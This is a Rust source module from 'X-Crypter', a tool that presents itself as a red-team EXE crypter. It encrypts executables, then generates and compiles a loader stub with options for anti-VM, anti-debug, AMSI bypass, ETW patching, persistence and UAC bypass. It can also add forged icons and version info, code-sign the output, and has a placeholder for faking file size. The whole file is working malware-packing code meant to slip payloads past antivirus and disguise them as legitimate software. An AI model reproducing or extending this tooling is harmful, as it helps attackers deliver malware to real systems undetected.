// X-Crypter Module
// Advanced EXE Crypter for Red Team Operations

pub mod encryptor;
pub mod pe_reader;
pub mod stub_gen;
pub mod mutator;
pub mod key_manager;
pub mod code_signing;
pub mod resource_manipulation;
pub mod string_obfuscator;
pub mod obfuscator;
pub mod validation;

pub use encryptor::*;
pub use pe_reader::*;
pub use key_manager::*;
pub use code_signing::*;
pub use resource_manipulation::*;

use std::fs;
use std::path::PathBuf;

/// Find project root directory for output files
fn find_project_root_for_output() -> Result<PathBuf, String> {
    // Strategy 1: Look for stub/Cargo.toml in current directory or parents
    let mut current = std::env::current_dir()
        .map_err(|e| format!("Failed to get current directory: {}", e))?;
    
    loop {
        let stub_cargo = current.join("stub/Cargo.toml");
        if stub_cargo.exists() {
            return Ok(current);
        }
        
        match current.parent() {
            Some(parent) => current = parent.to_path_buf(),
            None => break,
        }
    }
    
    // Strategy 2: Use executable path
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(exe_dir) = exe_path.parent() {
            let mut current = exe_dir.to_path_buf();
            
            loop {
                let stub_cargo = current.join("stub/Cargo.toml");
                if stub_cargo.exists() {
                    return Ok(current);
                }
                
                match current.parent() {
                    Some(parent) => current = parent.to_path_buf(),
                    None => break,
                }
            }
        }
    }
    
    // Strategy 3: Use CARGO_MANIFEST_DIR if available
    if let Ok(manifest_dir) = std::env::var("CARGO_MANIFEST_DIR") {
        let manifest_path = std::path::Path::new(&manifest_dir);
        if let Some(parent) = manifest_path.parent() {
            let stub_cargo = parent.join("stub/Cargo.toml");
            if stub_cargo.exists() {
                return Ok(parent.to_path_buf());
            }
        }
    }
    
    Err("Could not find project root directory (stub/Cargo.toml not found)".to_string())
}

/// Tauri command to save uploaded file to temp location
#[tauri::command]
pub async fn save_uploaded_file(file_data: Vec<u8>, file_name: String) -> Result<String, String> {
    // Get temp directory
    let temp_dir = std::env::temp_dir();
    let temp_file_path = temp_dir.join(format!("x-crypter-upload-{}", file_name));
    
    // Write file to temp location
    fs::write(&temp_file_path, file_data)
        .map_err(|e| format!("Failed to save uploaded file: {}", e))?;
    
    // Return path as string
    Ok(temp_file_path
        .to_str()
        .ok_or("Failed to convert path to string")?
        .to_string())
}

/// Tauri command to save uploaded icon file to temp location
#[tauri::command]
pub async fn save_uploaded_icon(file_data: Vec<u8>, file_name: String) -> Result<String, String> {
    // Get temp directory
    let temp_dir = std::env::temp_dir();
    let temp_file_path = temp_dir.join(format!("x-crypter-icon-{}", file_name));
    
    // Write file to temp location
    fs::write(&temp_file_path, file_data)
        .map_err(|e| format!("Failed to save uploaded icon: {}", e))?;
    
    // Return path as string
    Ok(temp_file_path
        .to_str()
        .ok_or("Failed to convert path to string")?
        .to_string())
}

/// Tauri command to validate a file before encryption
#[tauri::command]
pub async fn validate_file_for_encryption(file_path: String) -> Result<serde_json::Value, String> {
    use validation::{validate_file, validate_file_extension};
    
    // First check file extension
    if let Err(e) = validate_file_extension(&file_path) {
        return Err(e);
    }
    
    // Then validate file structure
    let validation = validate_file(&file_path);
    
    let result = serde_json::json!({
        "valid": validation.valid,
        "errors": validation.errors,
        "warnings": validation.warnings,
        "file_info": validation.file_info.map(|info| serde_json::json!({
            "size": info.size,
            "is_pe": info.is_pe,
            "is_dll": info.is_dll,
            "is_exe": info.is_exe,
            "architecture": info.architecture,
            "entry_point": info.entry_point,
        })),
    });
    
    if !validation.valid {
        return Err(validation.errors.join("; "));
    }
    
    Ok(result)
}

/// Tauri command to encrypt an executable
#[tauri::command]
pub async fn encrypt_exe(
    file_path: String,
    method: String,
    anti_vm: bool,
    anti_debug: bool,
    bypass_amsi: bool,
    patch_etw: bool,
    heap_encryption: bool,
    anti_dump: bool,
    _melt: bool,
    sleep_enabled: bool,
    sleep_seconds: u64,
    persistence: bool,
    persistence_method: Option<String>,
    bypass_uac: bool,
    code_signing: bool,
    certificate_path: Option<String>,
    certificate_password: Option<String>,
    enable_icon: bool,
    icon_path: Option<String>,
    enable_app_info: bool,
    app_name: Option<String>,
    app_description: Option<String>,
    app_version: Option<String>,
    enable_fake_size: bool,
    fake_size: Option<u64>,
    output_path: Option<String>,  // User-selected output path
) -> Result<String, String> {
    use validation::validate_file_extension;
    
    // Validate file extension first
    validate_file_extension(&file_path)
        .map_err(|e| format!("File validation failed: {}", e))?;
    
    // Validate file structure
    let validation = validation::validate_file(&file_path);
    if !validation.valid {
        return Err(format!(
            "File validation failed: {}",
            validation.errors.join("; ")
        ));
    }
    
    // Show warnings if any
    if !validation.warnings.is_empty() {
        eprintln!("⚠️ Validation warnings: {}", validation.warnings.join("; "));
    }
    
    // Parse encryption method
    let encryption_method = match method.as_str() {
        "aes" => EncryptionMethod::AES256,
        "xor" => EncryptionMethod::XOR,
        "rc4" => EncryptionMethod::RC4,
        "custom" => EncryptionMethod::Custom,
        _ => return Err(format!("Invalid encryption method: '{}'. Supported: aes, xor, rc4, custom", method)),
    };
    
    // Read PE file
    let pe_file = read_pe_file(&file_path)
        .map_err(|e| format!("Failed to read PE file: {}. Make sure the file is a valid PE executable.", e))?;
    
    // Get full PE data for encryption
    let pe_data = get_full_pe_data(&pe_file);
    
    // Encrypt payload
    let encryptor = Encryptor::new(encryption_method);
    let encryption_result = encryptor.encrypt_data(pe_data)?;
    
    // Generate stub code
    let stub_code = stub_gen::generate_stub_code(
        &encryption_result.encrypted_data,
        &encryption_result.key,
        encryption_result.iv.as_deref(),
        encryption_method,
        anti_vm,
        anti_debug,
        bypass_amsi,
        patch_etw,
        heap_encryption,
        anti_dump,
        sleep_enabled,
        sleep_seconds,
        persistence,
        persistence_method.as_deref(),
        bypass_uac,
    );
    
    // Write stub code to stub/src/main.rs
    crate::crypter::stub_gen::write_stub_code(&stub_code)
        .map_err(|e| format!("Failed to write stub code: {}", e))?;
    
    // Generate stub ID for keys file naming
    let stub_id = uuid::Uuid::new_v4().to_string()[..8].to_string();
    
    // Determine output path - use user-selected path or default to output/ directory
    let (output_exe, output_dir) = if let Some(user_path) = output_path {
        let path = PathBuf::from(&user_path);
        // For user-selected path, use parent directory for keys file
        let dir = path.parent()
            .map(|p| p.to_path_buf())
            .unwrap_or_else(|| std::env::temp_dir());
        (path, dir)
    } else {
        // Default: save to output/ directory in project root
        let project_root = find_project_root_for_output()?;
        let output_dir = project_root.join("output");
        if !output_dir.exists() {
            fs::create_dir_all(&output_dir)
                .map_err(|e| format!("Failed to create output directory: {}", e))?;
        }
        
        // Generate output filename
        let output_exe = output_dir.join(format!("encrypted_{}.exe", stub_id));
        (output_exe, output_dir)
    };
    
    // Create parent directory if it doesn't exist
    if let Some(parent) = output_exe.parent() {
        if !parent.exists() {
            fs::create_dir_all(parent)
                .map_err(|e| format!("Failed to create output directory: {}", e))?;
        }
    }
    
    // Compile stub to executable
    let compiled_path = crate::crypter::stub_gen::compile_stub(&output_exe)
        .map_err(|e| format!("Failed to compile stub: {}", e))?;
    
    // Apply resource manipulation (icon, version info)
    if enable_icon || enable_app_info {
        // icon_path should already be a full path from save_uploaded_icon
        let icon_full_path = if enable_icon {
            icon_path.as_ref().map(|p| {
                let path_buf = PathBuf::from(p);
                if path_buf.is_absolute() && path_buf.exists() {
                    p.clone()
                } else {
                    // Try in temp directory (fallback)
                    let temp_dir = std::env::temp_dir();
                    let temp_icon = temp_dir.join(format!("x-crypter-icon-{}", p));
                    if temp_icon.exists() {
                        temp_icon.to_str().unwrap_or(p).to_string()
                    } else {
                        p.clone()
                    }
                }
            })
        } else {
            None
        };
        
        let _ = apply_resources(
            &compiled_path,
            icon_full_path.as_deref(),
            if enable_app_info { app_name.as_deref() } else { None },
            if enable_app_info { app_description.as_deref() } else { None },
            if enable_app_info { app_version.as_deref() } else { None },
        );
    }
    
    // Apply fake size if enabled (future feature - placeholder)
    if enable_fake_size {
        if let Some(size) = fake_size {
            // TODO: Implement fake size modification
            // This would modify the PE file size in resources or metadata
            // For now, this is a placeholder
            eprintln!("Fake size feature requested: {} KB (not yet implemented)", size);
        }
    }
    
    // Code signing (if enabled)
    if code_signing {
        if let (Some(cert_path), Some(cert_pass)) = (certificate_path, certificate_password) {
            if let Err(e) = sign_executable(&compiled_path, &cert_path, &cert_pass) {
                // Log error but don't fail - signing is optional
                eprintln!("Code signing failed (non-fatal): {}", e);
            } else {
                // Verify signature
                if let Ok(is_signed) = verify_signature(&compiled_path) {
                    if is_signed {
                        println!("Executable successfully signed");
                    }
                }
            }
        }
    }
    
    // Also save encryption metadata for reference
    let keys = EncryptionKeys::from_result(&encryption_result);
    let keys_file = output_dir.join(format!("keys_{}.json", stub_id));
    let keys_json = serde_json::to_string_pretty(&keys)
        .map_err(|e| format!("Failed to serialize keys: {}", e))?;
    fs::write(&keys_file, keys_json)
        .map_err(|e| format!("Failed to save keys: {}", e))?;
    
    Ok(format!(
        "Encryption and compilation successful!\n- Stub code: {} bytes\n- Compiled executable: {:?}\n- Keys saved to: {:?}",
        stub_code.len(),
        compiled_path,
        keys_file
    ))
}
